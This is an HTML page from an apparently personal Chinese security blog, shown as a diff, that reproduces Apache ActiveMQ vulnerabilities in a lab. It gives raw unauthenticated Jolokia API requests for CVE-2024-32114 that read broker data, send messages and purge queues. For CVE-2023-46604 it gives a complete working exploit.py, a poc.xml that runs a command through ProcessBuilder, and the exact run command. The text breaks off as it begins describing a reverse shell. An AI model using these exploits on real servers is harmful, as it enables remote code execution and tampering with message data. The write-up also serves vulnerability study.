@@ -1,0 +1,803 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hexi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Apache ActiveMQ Jolokia REST API 未授权访问漏洞（CVE-2024-32114）0x01 利用条件权限要求：无需权限 其他条件：允许远程访问 0x02 影响版本6.0.0 &lt;&#x3D; Apache ActiveMQ &lt; 6.1.2 0x03 漏洞复现访问&#x2F;api&#x2F;jolokia可看到相关信息  获取AactiveMQ代理消息 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ漏洞历史整合复现">
+<meta property="og:url" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="hexi的个人博客">
+<meta property="og:description" content="Apache ActiveMQ Jolokia REST API 未授权访问漏洞（CVE-2024-32114）0x01 利用条件权限要求：无需权限 其他条件：允许远程访问 0x02 影响版本6.0.0 &lt;&#x3D; Apache ActiveMQ &lt; 6.1.2 0x03 漏洞复现访问&#x2F;api&#x2F;jolokia可看到相关信息  获取AactiveMQ代理消息 12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724840553370-3f0853b3-9bbb-4f59-b224-bc5c63714031-1742559432764-2.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724840464486-13cbf490-dddf-4989-91d7-02b16b806ec1.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724840509720-e10f423b-7628-49bf-b3e1-5e4238f82932.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724838678598-dcc6757d-0559-49e7-9319-11830805689c.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724838801755-b83f41a5-78da-4c89-8ce5-f48509ea095f.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724601155289-ada7dcff-dbf2-4a18-9b22-d94a537c0335.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724256766046-f74ccf99-52d8-4c7c-9435-9dbe43dc89df.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724298781667-d18c8d7b-30d8-4c39-a463-77ed2a2f151b.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724577587029-22024e75-077e-4533-84ed-4c8e0fa4aeb6.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724526885429-a0decfa4-bcee-4b23-abd9-06225ff445a7.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724529387115-fb27644d-0873-4917-8b0c-155752604cdf.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724526912511-23663d9c-976b-416c-be6b-34382aea884b.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724529264926-07f6b19b-7854-4058-9740-db37c155ba6f.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724685592570-e0f93781-ab0b-430e-b6e2-037682d83921.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724685462299-54616ed3-9879-48de-a981-1c0293292ac0.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724583377929-3eef9ad0-08df-40af-b8f2-7de7f89895ea.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724583530047-2fa244c4-5051-40ec-b526-79739bf645c4.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724382814963-85a2a39f-d1dc-45b0-af65-2af24960aba5.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724382868739-e57075e6-c4fb-43ef-8db1-324070c7f9d8.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724599755200-37c275e5-cd05-438f-8036-f38bca53db5b.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724382897232-d4554bba-5263-4efe-9899-a7bf13d6298d.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724382881852-9eceb668-f323-463d-9774-12b43c535680.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724383015370-6085b85e-cd62-4dba-873f-d590426f2e4e.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724394253065-0eddb390-7807-4fb7-8257-76ed7e768b03.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724394283758-7d90983c-eb7c-42e4-9a87-b30c581fcf6b.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724394377638-19a6e84f-bf80-4920-a479-792e5b47f7db.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724394401456-1a4bcaa1-6653-481d-aa98-f441eefd1745.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724587958217-1878f441-3d38-4dbc-904a-c448acca33b8.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724429227821-c72c5f69-87f3-47d7-9c3c-1a72f0184972.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724429433956-38043d39-bb6d-4c83-b116-bb59613b2307.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724429481108-f13c8f64-d7bd-4b55-bd92-ffe8801eaca2.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724429576155-2255bc34-283e-4f91-ae04-3fdd0dd80778.png">
+<meta property="og:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724429551883-de3e94cc-5450-4e1b-9e54-bdbd8287b168.png">
+<meta property="article:published_time" content="2025-03-21T12:15:14.000Z">
+<meta property="article:modified_time" content="2025-03-21T12:46:41.120Z">
+<meta property="article:author" content="hexi">
+<meta property="article:tag" content="Apache">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/03/21/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%8E%86%E5%8F%B2%E6%95%B4%E5%90%88%E5%A4%8D%E7%8E%B0/1724840553370-3f0853b3-9bbb-4f59-b224-bc5c63714031-1742559432764-2.png">
+  
+  
+  
+  <title>ActiveMQ漏洞历史整合复现 - hexi的个人博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ActiveMQ漏洞历史整合复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-21 20:15" pubdate>
+          2025年3月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ActiveMQ漏洞历史整合复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Apache-ActiveMQ-Jolokia-REST-API-未授权访问漏洞（CVE-2024-32114）"><a href="#Apache-ActiveMQ-Jolokia-REST-API-未授权访问漏洞（CVE-2024-32114）" class="headerlink" title="Apache ActiveMQ Jolokia REST API 未授权访问漏洞（CVE-2024-32114）"></a>Apache ActiveMQ Jolokia REST API 未授权访问漏洞（CVE-2024-32114）</h3><h4 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p>
+<p>其他条件：允许远程访问</p>
+<h4 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>6.0.0 &lt;&#x3D; Apache ActiveMQ &lt; 6.1.2</p>
+<h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>访问&#x2F;api&#x2F;jolokia可看到相关信息</p>
+<p><img src="1724840553370-3f0853b3-9bbb-4f59-b224-bc5c63714031-1742559432764-2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>获取AactiveMQ代理消息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost HTTP/1.1<br>Host: 192.168.187.129:8161<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Connection: close<br></code></pre></td></tr></table></figure>
+
+<p><img src="1724840464486-13cbf490-dddf-4989-91d7-02b16b806ec1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>列出所有队列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=* HTTP/1.1<br>Host: 192.168.187.129:8161<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Connection: close<br></code></pre></td></tr></table></figure>
+
+<p><img src="1724840509720-e10f423b-7628-49bf-b3e1-5e4238f82932.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>向队列发送消息，从上面知道有队列“1”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /api/message/1 HTTP/1.1<br>Host: 192.168.187.129:8161<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 80<br><br>&#123;<br>  &quot;body&quot;: &quot;Hello, World!&quot;,<br>  &quot;properties&quot;: &#123;<br>    &quot;JMSPriority&quot;: 4<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="1724838678598-dcc6757d-0559-49e7-9319-11830805689c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>删除队列中的消息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /api/jolokia/ HTTP/1.1<br>Host: 192.168.187.129:8161<br>Origin:localhost:8161<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 157<br><br><br>&#123;<br>  &quot;type&quot;: &quot;exec&quot;,<br>  &quot;mbean&quot;: &quot;org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=1&quot;,<br>  &quot;operation&quot;: &quot;purge&quot;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="1724838801755-b83f41a5-78da-4c89-8ce5-f48509ea095f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="Apache-ActiveMQ-远程代码执行漏洞-CVE-2023-46604"><a href="#Apache-ActiveMQ-远程代码执行漏洞-CVE-2023-46604" class="headerlink" title="Apache ActiveMQ 远程代码执行漏洞(CVE-2023-46604)"></a>Apache ActiveMQ 远程代码执行漏洞(CVE-2023-46604)</h3><h4 id="0x01-利用条件-1"><a href="#0x01-利用条件-1" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h4><p>权限要求：无需权限</p>
+<p>其他条件：允许远程访问</p>
+<h4 id="0x02-影响版本-1"><a href="#0x02-影响版本-1" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Apache AchtiveMQ &lt;&#x3D; 5.18.2</p>
+<h4 id="0x03-漏洞复现-1"><a href="#0x03-漏洞复现-1" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p><img src="1724601155289-ada7dcff-dbf2-4a18-9b22-d94a537c0335.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>编写一个python脚本，需要远程加载poc.xml进行利用，因此需要在poc所在目录利用python搭建一个简易的http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -m http.server 8000<br></code></pre></td></tr></table></figure>
+
+<p>exploit.py详细代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs plain">import socket <br>import argparse <br> <br>def main(ip, port, url): <br>    if not ip or not url: <br>        print(&quot;Usage: script.py -i &lt;ip&gt; -p &lt;port&gt; -u &lt;url&gt;&quot;) <br>        return <br>     <br>    banner() <br>     <br>    class_name = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot; <br>    message = url <br> <br>    header = &quot;1f00000000000000000001&quot; <br>    body = header + &quot;01&quot; + int2hex(len(class_name), 4) + string2hex(class_name) + &quot;01&quot; + int2hex(len(message), 4) + string2hex(message) <br>    payload = int2hex(len(body) // 2, 8) + body <br>    data = bytes.fromhex(payload) <br> <br>    print(&quot;[*] Target:&quot;, f&quot;&#123;ip&#125;:&#123;port&#125;&quot;) <br>    print(&quot;[*] XML URL:&quot;, url) <br>    print() <br>    print(&quot;[*] Sending packet:&quot;, payload) <br> <br>    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>    conn.connect((ip, int(port))) <br>    conn.send(data) <br>    conn.close() <br> <br>def banner(): <br>    print(&quot;     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n&quot;) <br> <br>def string2hex(s): <br>    return s.encode().hex() <br> <br>def int2hex(i, n): <br>    if n == 4: <br>        return format(i, &#x27;04x&#x27;) <br>    elif n == 8: <br>        return format(i, &#x27;08x&#x27;) <br>    else: <br>        raise ValueError(&quot;n must be 4 or 8&quot;) <br> <br>if __name__ == &quot;__main__&quot;: <br>    parser = argparse.ArgumentParser() <br>    parser.add_argument(&quot;-i&quot;, &quot;--ip&quot;, help=&quot;ActiveMQ Server IP or Host&quot;) <br>    parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, default=&quot;61616&quot;, help=&quot;ActiveMQ Server Port&quot;) <br>    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, help=&quot;Spring XML Url&quot;) <br>    args = parser.parse_args() <br>     <br>    main(args.ip, args.port, args.url)<br></code></pre></td></tr></table></figure>
+
+<p>poc.xml利用文件代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;<br>       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;<br>       xsi:schemaLocation=&quot;<br>     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;<br>    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;<br>        &lt;constructor-arg &gt;<br>            &lt;list&gt;<br>                &lt;value&gt;calc&lt;/value&gt;<br>            &lt;/list&gt;<br>        &lt;/constructor-arg&gt;<br>    &lt;/bean&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure>
+
+<p>运行exploit.py，输入目标ip和端口，以及搭建的简易http服务链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python exploit.py -i 192.168.0.107 -p 61616 -u http://127.0.0.1:8000/poc.xml<br></code></pre></td></tr></table></figure>
+
+<p><img src="1724256766046-f74ccf99-52d8-4c7c-9435-9dbe43dc89df.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>反弹shell操作：在攻击机开启nc端口，编写poc.xml输入攻击机ip</p>
